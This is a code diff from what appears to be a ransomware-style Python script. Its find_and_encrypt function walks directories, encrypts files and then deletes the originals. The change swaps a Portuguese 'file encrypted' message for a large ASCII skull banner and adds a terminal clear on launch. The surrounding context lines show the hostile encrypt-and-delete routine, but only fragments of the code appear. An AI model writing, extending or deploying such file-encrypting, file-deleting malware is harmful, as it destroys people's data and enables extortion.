@@ -130,8 +130,9 @@ def find_and_encrypt(
                                     )
                                 )
                             ):
-                                # # show.
-                                print(f'\33[34mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
+                                # # show present.
+                                print ("  ___  _                __ \n |   \\(_)_ __  ___ _ _ / _|\n | |) | | '  \\/ _ \\ '_|  _|\n |___/|_|_|_|_\\___/_| |_|\n                                   \ncddddddddddddddddddddddddddddddddddddddddddd;\n0Mo..........':ldkO0KKXXKK0kxoc,..........kMd\n0Ml......;d0WMMMMMMMMMMMMMMMMMMMWKx:......kMd\n0Ml...cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:...kMd\n0Ml.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc.kMd\n0MdKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OMd\n0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd\n0MxcxWMMMMMNXXNMMMMMMMMMMMMMMMNXXNMMMMMWkcKMd\n0Md..lMKo,.,'...:kWMMMMMMMNx;...',.;dXMl.'XMd\n0Mx'.,O;dXMMMXl....:dWMNo;....oXMMMKd;0,.'KMd\n0MO;.,NMWMMMMMMWk;...XMK...:OWMMMMMMWMN,.cNMd\n0MxxNMX;KMMKdcclkWN0WMMMN0WNxc:lxXMMk;WMXdKMd\n0MMMMMO;MMl.......KMXOMNkMk.......xMM.NMMMMMd\n0MMMMMMXKoclddl;.oWMdkMN,MN:.:ldolcdXNMMMMMMd\n0MMMMMMWXMMMMMMMW0KdoNMMdox0MMMMMMMMXMMMMMMMd\n0MMMMXc'WMMMMMMMMkcWMMMMMMkcMMMMMMMMN'lXMMMMd\n0MMMd..cMMMMMMMMNdoKMMMMM0x:XMMMMMMMM:..kMMMd\n0MM0....d0KKOd:.....c0Kx'.....:d0NX0l....NMMd\n0MMO.....................................WMMd\n0Mdkc...................................0kOMd\n0Ml.:Ol;........';;.......;,........':oX:.kMd\n0Ml..,WMMMMWWWo...';;:c::;'...:WWMMMMMW;..kMd\n0Ml...dMMMMMMMMKl...........c0MMMMMMMMd...kMd\n0Ml...cMMMMMMMMMMMXOxdddk0NMMMMMMMMMMM'...kMd\n0Ml....KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO....kMd\n0Ml.....OMMMMMMMMMMMMMMMMMMMMMMMMMMMK.....kMd\n0Ml......:XMMMMMMMMMMMMMMMMMMMMMMMNl......kMd\n0Ml........lXMMMMMMMMMMMMMMMMMMMKc........kMd\n0Ml..........:KMMMMMMMMMMMMMMM0,..........kMd\noO:............xOOOx:'';dOOOOd............lOc\n\n")
+
                         
                         # # remove the original file.
                         os.remove(
@@ -140,7 +141,7 @@ def find_and_encrypt(
                                 file
                             )
                         )
-                    
+                                            
                     except PermissionError as e:
                         pass
                 
@@ -227,4 +228,5 @@ def find_and_encrypt(
                                 
                             
 if __name__ == '__main__':
+    os.system('clear')
     check_os('posix')
